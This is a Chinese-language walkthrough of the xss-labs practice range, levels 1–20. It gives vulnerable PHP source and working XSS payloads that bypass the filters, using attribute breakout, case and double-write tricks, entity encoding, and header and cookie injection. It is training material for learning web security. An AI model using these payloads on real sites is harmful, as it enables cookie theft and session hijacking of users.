# 搭建xss-labs

## 源码

https://github.com/do0dl3/xss-labs

## 参考

https://blog.csdn.net/wo41ge/article/details/107459332

# 访问靶场

http://192.168.31.193:8080

## level1

http://192.168.31.193:8080/level1.php?name=test

```php
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
```

### 没有任何过滤，get型
`?name=<script>alert(document.cookie)</script>`
## level2

http://192.168.31.193:8080/level2.php?keyword=test

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
```

第一处参数输出被**htmlspecialchars函数**处理
第二处没有做过滤。

### 测试有做了什么过滤

`<sCr<scrscRiptipt>ipt>OonN\&apos;\"<>`

查看网页源码

```html
<h2 align=center>没有找到和&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;&lt;&gt; 相关的结果.</h2><center>
<input name=keyword  value="<sCr<scrscRiptipt>ipt>OonN\&apos;\"<> ">
```

### 使用**">**闭合

`?keyword="> <script>alert(document.cookie)</script> <"`

## level3

http://192.168.31.193:8080/level3.php?writing=wait

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
```

### 测试有做了什么过滤

`<sCr<scrscRiptipt>ipt>OonN\&apos;\"<>`

```html
<h2 align=center>没有找到和&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;&lt;&gt;相关的结果.</h2><center>
<form action=level3.php method=GET>
<input name=keyword  value='&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;&lt;&gt;'>
```

两个输出参数的地方都有被过滤,单引号没有过滤。

| <    | `&lt;`    |
| ---- | --------- |
| >    | `&gt;`    |
| "    | `\&quot;` |

闭合value='的单引号

> onmouseover事件会在**鼠标指针移动**到指定的对象上时触发事件发生。

`?writing=' onmouseover='alert(/xss/)'`

移动鼠标到输入框触发xss.

## level4

http://192.168.31.193:8080/level4.php?keyword=try%20harder!

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

将前后**括号**替换为空，**双引号"**闭合

`" onmouseover="alert(/xss/)`

## level5

http://192.168.31.193:8080/level5.php?keyword=find%20a%20way%20out!

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

对**<script和on**做了加下划线处理，**双引号"**闭合

**strtolower()函数**，他会把提交的所有字符转换为**小写**



测试做了什么处理

`<script " 'Oonn>`

变成了 

`<scr_ipt " 'oo_nn>`

在中间加了下划线,大O变成小写了。

关键字处理一次，单引号和双引号依然存在。

`"><a href ="javascript:alert:alert(/xss/)">click</a>`



## level6

http://192.168.31.193:8080/level6.php?keyword=break%20it%20out!

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

对**<script，on，src，data，href**做了加下划线处理。



测试过滤了什么

`<script " 'Oonn>`

<scr_ipt " 'Oo_nn>

和之前过滤一下。尝试之前的payload

`"><a href ="javascript:alert:alert(/xss/)">click</a>`

发现超链接被过滤

<a hr_ef ="javascript:alert:alert(/xss/)">click</a>

尝试**大小写** ，**hrEf**

``"><a hrEf ="javascript:alert:alert(/xss/)">click</a>``

## level7

http://192.168.31.193:8080/level7.php?keyword=move%20up!

```PHP
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

strtolower将传参变为小写，

script，on，src，data，href被替换为空，

尝试**双写** s*script*cript

`"><sscriptcript> alert(/xss/)</sscriptcript>`

## level8

http://192.168.31.193:8080/level8.php?keyword=nice%20try!

```PHP
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
```

测试过滤了什么

`<script " 'Oonn>`

<a href="<scr_ipt &quot 'oo_nn>">友情链接

单引号没有被处理，尝试使用伪协议

`javascript:alert(/xss/)`

<a href="javascr_ipt:alert(/xss/)">

也被处理了，尝试使用**16进制编码**

**s**的16进制是 &**#x73;**

`java&#x73;cript:alert(/xss/)`



总结

hackbar无法提交unicode，`&`被当成参数了，可以尝试将`&`进行url编码，或直接在网页的输入payload了

unicode可以和ascii码混合使用；s的unicode加ascii编码是`&#115;`，再进行16进制转换是`&#x73;`

unicode有两种，`&#`的是web网页上使用的，`\u`是java上使用的。

## level9

http://192.168.31.193:8080/level9.php?keyword=not%20bad!

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
```

测试过滤了什么

`<script " 'Oonn>`

<a href="您的链接不合法？有没有！">

没有显示怎么处理的.

尝试上有关的payload

`java&#x73;cript:alert(/xss/)`

<a href="您的链接不合法？有没有！">

依旧提示**链接不合法**，换成百度**'http://www.baidu.com'**试试。

`java&#x73;cript:alert('http://www.baidu.com')`

## level10

http://192.168.31.193:8080/level10.php?keyword=well%20done!

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

测试过滤了什么

`<script " 'Oonn>`

没有显示处理内容，但是发现**三个隐藏标签**

```html
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
```

可能这些参数处理了内容

测试这三个参数

`?t_link=<script " 'Oonn>`没有内容

`?t_history=<script " 'Oonn>`没有内容

`?t_sort=<script " 'Oonn>`有内容

```html
<input name="t_sort"  value="script " 'Oonn" type="hidden">
```

前后括号被过滤了。

将payload设置成可以点击可以弹窗的**按钮**。

`?t_sort=click"type="button" onclick="alert(/xss/)`

## level11

http://192.168.31.193:8080/level11.php?keyword=good%20job!

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```



测试过滤了什么

`<script " 'Oonn>`

```html
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_ref"  value="" type="hidden">
```

有4个隐藏标签

使用上一关的payload测试一下第四个参数

`?t_ref=click"type="button" onclick="alert(/xss/)`

依旧没有结果

burpsuip抓包查看参数怎么来的

猜测t_ref是referer地址来源

![image-20221120190357176](https://img.gyxnb.top/img/image-20221120190357176.png)

`click"type="button" onclick="alert(/xss/)`

## level12

http://192.168.31.193:8080/level12.php?keyword=good%20job!

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

测试过滤了什么

`<script " 'Oonn>`

也没有显示输入的内容，

```html
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_ua"  value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36" type="hidden">
```

但也有4个隐藏传参,

发现t_ua这个参数就是useragent

![image-20221120191102558](https://img.gyxnb.top/img/image-20221120191102558.png)

`click"type="button" onclick="alert(/xss/)`

## level13

http://192.168.31.193:8080/level13.php?keyword=good%20job!

```php
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

测试过滤了什么

`<script " 'Oonn>`

也没有显示输入的内容

```html
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_cook"  value="call me maybe?" type="hidden">
```

4个隐藏参数，猜测t_cook是cookie

![image-20221120192620976](https://img.gyxnb.top/img/image-20221120192620976.png)

改cookie中的user

![image-20221120192546998](https://img.gyxnb.top/img/image-20221120192546998.png)

`user=click"type="button" onclick="alert(/xss/)`

## level14

http://192.168.31.193:8080/level14.php

```php
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xsschallenge/level15.php?src=1.gif>点我进level15</a></center>
```



```html
<center>这关成功后不会自动跳转。成功者<a href=/xsschallenge/level15.php?src=1.gif>点我进level15</a></center>
```

这一关iframe调用的文件地址失效，已经无法测试了。 

这里可以简单复现一下这种触发XSS的环境。

可交换图像文件格式英语：Exchangeable image file format， 官方简称**Exif** 

是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。

可使用鼠标右键 进入属性页面查看部分信息。



有些网站有**读取图片exif信息**的功能

当网站读取到的恶意的exif信息就会触发这个payload

先创建一个exifxss.php的文件 

然后在当前文件夹下面放一张名为404.jpg的数码图片

![image-20221120205022092](https://img.gyxnb.top/img/image-20221120205022092.png)

`'"<script>alert(2)</script>`

**下载Exif Viewer插件**

https://chromecj.com/Handler/Download/56



接着访问一下 http://192.168.31.193:8080/404.jpg

![image-20221120205738703](https://img.gyxnb.top/img/image-20221120205738703.png)

## level15

http://192.168.31.193:8080/level15.php?src=1.gif

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"></script>
<script>
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
```

通过第一行以及我们提交的参数src的值被插入到标签的class属性值中

发现这里用了angular.min.js的**ng-include**

将国外的angular.min.js换成国内的js

```js
https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js
```

其作用相当于php的**include函数**。

这里就是将1.gif这 个**文件包含**进来。

### ng-include指令具体的用法 

1. ng-include 指令用于包含外部的 HTML文件。 
2. 包含的内容将作为指定元素的子节点。 
3. ng-include 属性的值可以是一个表达式，返回一个文件名。
4.  默认情况下，包含的文件需要包含在同一个域名下。 

#### 特别值得注意： 

1. ng-include,如果单纯指定地址，必须要加引号 
2. ng-include,加载外部html，script标签中的内容不执行 
3. ng-include,加载外部html中含有style标签样式可以识别



查看网页源代码

```html
<body><span class="ng-include:1.gif"></span></body>
```

使用了**ng-include**包含文件1.gif

既然这里可以包含html文件

那么也就可以**包含之前有过xss漏洞的源文件**

`?src='level1.php'`

payload:

`'level1.php?name=<img src=x onerror=alert(/XSS/)>'`

## level16

http://xss.com:8080/level16.php?keyword=test

```
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
```

小写，替换**script，空格，/**



测试过滤了什么

`<script " 'Oonn>`

```html
<center><&nbsp;&nbsp;"&nbsp;'oonn></center>
```

script和空格被替换为 `&nbsp;`大写变成小写。

用**回车替换空格来将它们分开**

回车：`%0a`， `%0d`

```html
<img%0asrc=xss%0donmouseover=alert('xss')>
```

## level17

http://192.168.31.193:8080/level17.php?arg01=a&arg02=b

```php+HTML
<body>
<h1 align=center>欢迎来到level17</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
<h2 align=center>成功后，<a href=level18.php?arg01=a&arg02=b>点我进入下一关</a></h2>
</body>
```

两个输出的值都被做了实体化转义，无法闭合标签

但是问题在于本身***embed标签***可以加入事件，

可以**在arg01,或者arg02中加入事件**去触发即可

空格：`%20`

`?arg01=1%20onmouseover=alert('xss')&arg02=b`

## level18

http://192.168.31.193:8080/level18.php?arg01=a&arg02=b

```php+HTML
<body>
<h1 align=center>欢迎来到level18</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
</body>
```

同样是 `<embed>`标签

尝试继续在参数里加事件

`?arg01=1%20onmouseover=alert('xss')&arg02=b`

## level19

http://192.168.31.193:8080/level19.php?arg01=a&arg02=b

```php+HTML
<body>
<h1 align=center>欢迎来到level19</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
```

在源码中可知src=xsf03.swf

去xsf03.swf寻找sIFR

sIFR：当页面下载时，在一个指定的元素中用**Flash**渲染的文字来代替一些文本。

使用JPEXS这工具，首先定位getURL函数

**getURL**函数，利用这个函数我们就可以自动打开指定的网页，开启条件就是链接形式



```
sIFR.menuItems.push(new ContextMenuItem("Followlink",function() 
{ 
getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget); 
}),new ContextMenuItem("Open link in new window",function() 
{ 
getURL(sIFR.instance.primaryLink,"_blank");})); 
再追踪到sIFR的内容,省略了一些代码，关键代码如下： 
if(_loc5_ && _root.version != sIFR.VERSION) 
{ 
_loc4_ = sIFR.VERSION_WARNING.split("%s").join(_root.version); 
} 
得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL 只在内容为link
时，打开，故定位以下函数： 
function contentIsLink() 
{ 
return this.content.indexOf("<a ") == 0 &&(this.content.indexOf("<a ") 
==this.content.lastIndexOf("<a ") &&this.content.indexOf("</a>") == 
this.content.length - 4); 
} //大体意思是要geturl得用a标签。
```



`?arg01=version&arg02=b`

就是version=b

a标签构造链接

`?arg01=version&arg02=<a%20href="javascript:alert(%27xss%27)">111</a>`



## level20

http://192.168.31.193:8080/level20.php?arg01=a&arg02=b

```php+HTML
<body>
<h1 align=center>欢迎来到level20</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
```



`?arg01=id&arg02=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)*//&width&height*`

没有弄出来。

结束...

